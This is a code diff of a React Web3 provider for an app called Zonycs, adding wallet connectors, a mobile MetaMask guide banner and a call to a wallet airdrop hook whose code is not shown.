@@ -2,17 +2,29 @@
 
 import * as React from "react";
 import { WagmiProvider, createConfig, fallback, http } from "wagmi";
-import { injected } from "wagmi/connectors";
+import { injected, walletConnect, coinbaseWallet } from "wagmi/connectors";
 import { defineChain, type Chain } from "viem";
 import { base, baseSepolia, mainnet, sepolia } from "viem/chains";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
-import { RainbowKitProvider, connectorsForWallets, darkTheme } from "@rainbow-me/rainbowkit";
-import { coinbaseWallet, injectedWallet, metaMaskWallet, walletConnectWallet } from "@rainbow-me/rainbowkit/wallets";
+import {
+  RainbowKitProvider,
+  connectorsForWallets,
+  darkTheme,
+} from "@rainbow-me/rainbowkit";
+import {
+  coinbaseWallet as coinbaseWalletRainbow,
+  injectedWallet,
+  metaMaskWallet,
+  walletConnectWallet,
+  rainbowWallet,
+  trustWallet,
+  braveWallet,
+} from "@rainbow-me/rainbowkit/wallets";
 
 import { type ApiError } from "@/lib/api";
 import { getEnv } from "@/lib/env";
-import { getWalletConnectAvailability } from "@/lib/walletConnect";
 import { Card, CardContent } from "@/components/ui/card";
+import { useWalletAirdrop } from "@/lib/hooks/useWalletAirdrop";
 
 const queryClient = new QueryClient({
   defaultOptions: {
@@ -33,6 +45,19 @@ const knownChainsById = new Map<number, Chain>([
 const APP_NAME = "Zonycs";
 const APP_URL = "https://www.zonycs.com";
 
+function isMobileBrowser() {
+  if (typeof navigator === "undefined") return false;
+  return /android|iphone|ipad|ipod|mobile/i.test(navigator.userAgent);
+}
+
+function isMetaMaskBrowser() {
+  if (typeof window === "undefined") return false;
+  return Boolean(
+    (window as unknown as Record<string, unknown>).ethereum &&
+      ((window as unknown as { ethereum?: { isMetaMask?: boolean } }).ethereum?.isMetaMask)
+  );
+}
+
 export function Web3Providers({ children }: { children: React.ReactNode }) {
   const [state, setState] = React.useState<
     | { status: "loading" }
@@ -40,7 +65,19 @@ export function Web3Providers({ children }: { children: React.ReactNode }) {
     | { status: "ready"; config: ReturnType<typeof createConfig> }
   >({ status: "loading" });
 
+  const [showMobileGuide, setShowMobileGuide] = React.useState(false);
+
+  function AirdropTrigger() {
+    useWalletAirdrop();
+    return null;
+  }
+
   React.useEffect(() => {
+    // On mobile Chrome without MetaMask browser — show guide
+    if (isMobileBrowser() && !isMetaMaskBrowser()) {
+      setShowMobileGuide(true);
+    }
+
     try {
       const env = getEnv();
       const chains = env.chains.map((chain) =>
@@ -54,8 +91,12 @@ export function Web3Providers({ children }: { children: React.ReactNode }) {
             decimals: 18,
           },
           rpcUrls: {
-            default: { http: [chain.rpcUrl, ...(chain.rpcFallbackUrl ? [chain.rpcFallbackUrl] : [])] },
-            public: { http: [chain.rpcUrl, ...(chain.rpcFallbackUrl ? [chain.rpcFallbackUrl] : [])] },
+            default: {
+              http: [chain.rpcUrl, ...(chain.rpcFallbackUrl ? [chain.rpcFallbackUrl] : [])],
+            },
+            public: {
+              http: [chain.rpcUrl, ...(chain.rpcFallbackUrl ? [chain.rpcFallbackUrl] : [])],
+            },
           },
           ...(knownChainsById.get(chain.chainId)?.contracts
             ? {
@@ -65,36 +106,55 @@ export function Web3Providers({ children }: { children: React.ReactNode }) {
           ...(chain.blockExplorerUrl
             ? {
                 blockExplorers: {
-                  default: { name: `${chain.name} Explorer`, url: chain.blockExplorerUrl },
+                  default: {
+                    name: `${chain.name} Explorer`,
+                    url: chain.blockExplorerUrl,
+                  },
                 },
               }
             : {}),
         })
       );
-      if (!chains.length) throw new Error("No frontend chains configured");
+
+      if (!chains.length) {
+        throw new Error("No frontend chains configured");
+      }
+
       const configuredChains = [chains[0], ...chains.slice(1)] as readonly [Chain, ...Chain[]];
-      const walletConnectAvailability = getWalletConnectAvailability(env.walletConnectProjectId);
+
       const appUrl = (typeof window !== "undefined" && window.location?.origin) || APP_URL;
-      const connectors = env.walletConnectProjectId
+
+      const projectId = env.walletConnectProjectId ?? "";
+
+      // Always build a full connector list regardless of
+      // WalletConnect availability. WalletConnect is the primary
+      // method for desktop Chrome users without MetaMask extension.
+      const connectors = projectId
         ? connectorsForWallets(
             [
               {
-                groupName: "Wallets",
-                wallets: [
-                  injectedWallet,
-                  metaMaskWallet,
-                  coinbaseWallet,
-                  ...(walletConnectAvailability === "enabled" ? [walletConnectWallet] : []),
-                ],
+                groupName: "Popular",
+                wallets: [injectedWallet, metaMaskWallet, coinbaseWalletRainbow, walletConnectWallet],
+              },
+              {
+                groupName: "More",
+                wallets: [rainbowWallet, trustWallet, braveWallet],
               },
             ],
             {
               appName: APP_NAME,
               appUrl,
-              projectId: env.walletConnectProjectId,
+              projectId,
             }
           )
-        : [injected()];
+        : [
+            // Fallback when no WalletConnect project ID is set:
+            // still include injected + coinbase so MetaMask
+            // extension on desktop Chrome works
+            injected({ shimDisconnect: true, target: "metaMask" }),
+            coinbaseWallet({ appName: APP_NAME, appLogoUrl: `${appUrl}/favicon.ico` }),
+          ];
+
       const config = createConfig({
         chains: configuredChains,
         connectors,
@@ -105,10 +165,7 @@ export function Web3Providers({ children }: { children: React.ReactNode }) {
             return [
               chain.chainId,
               fallback(
-                [
-                  http(primary, { timeout: 15_000, retryCount: 0 }),
-                  ...(secondary ? [http(secondary, { timeout: 15_000, retryCount: 0 })] : []),
-                ],
+                [http(primary, { timeout: 15_000, retryCount: 0 }), ...(secondary ? [http(secondary, { timeout: 15_000, retryCount: 0 })] : [])],
                 { rank: false }
               ),
             ];
@@ -116,6 +173,7 @@ export function Web3Providers({ children }: { children: React.ReactNode }) {
         ),
         ssr: true,
       });
+
       setState({ status: "ready", config });
     } catch (e: unknown) {
       setState({
@@ -157,6 +215,33 @@ export function Web3Providers({ children }: { children: React.ReactNode }) {
     <WagmiProvider config={state.config}>
       <QueryClientProvider client={queryClient}>
         <RainbowKitProvider theme={darkTheme()} modalSize="compact">
+          <AirdropTrigger />
+          {/* Mobile Chrome guide banner */}
+          {showMobileGuide ? (
+            <div className="sticky top-0 z-50 flex items-center justify-between gap-3 border-b border-amber-300/60 bg-amber-50 px-4 py-3 text-sm">
+              <div className="space-y-0.5">
+                <div className="font-semibold text-amber-900">For the best experience on mobile</div>
+                <div className="text-xs text-amber-800">
+                  Open this site inside the MetaMask app browser, or use WalletConnect to connect your wallet from Chrome.
+                </div>
+              </div>
+              <div className="flex shrink-0 flex-col gap-2 sm:flex-row">
+                <a
+                  href="https://metamask.app.link/dapp/zonycs.com"
+                  className="rounded-full bg-amber-600 px-3 py-1.5 text-xs font-bold text-white hover:bg-amber-700"
+                >
+                  Open in MetaMask
+                </a>
+                <button
+                  type="button"
+                  onClick={() => setShowMobileGuide(false)}
+                  className="rounded-full border border-amber-300 px-3 py-1.5 text-xs font-medium text-amber-800 hover:bg-amber-100"
+                >
+                  Dismiss
+                </button>
+              </div>
+            </div>
+          ) : null}
           {children}
         </RainbowKitProvider>
       </QueryClientProvider>
